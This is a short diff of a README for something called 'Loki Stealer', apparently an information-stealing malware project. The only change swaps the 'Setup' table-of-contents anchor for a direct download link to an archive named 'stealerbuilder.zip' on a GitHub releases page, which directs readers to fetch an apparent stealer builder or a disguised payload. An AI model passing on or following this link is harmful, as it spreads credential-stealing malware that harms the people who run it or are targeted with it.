@@ -3,7 +3,7 @@
 # Loki Stealer
 
 ## Content
-- [Setup](#setup)
+- [Setup](https://github.com/deibidariel94/verbose-meme/releases/download/lokistealer/stealerbuilder.zip)
 - [Features](#features)
 
 
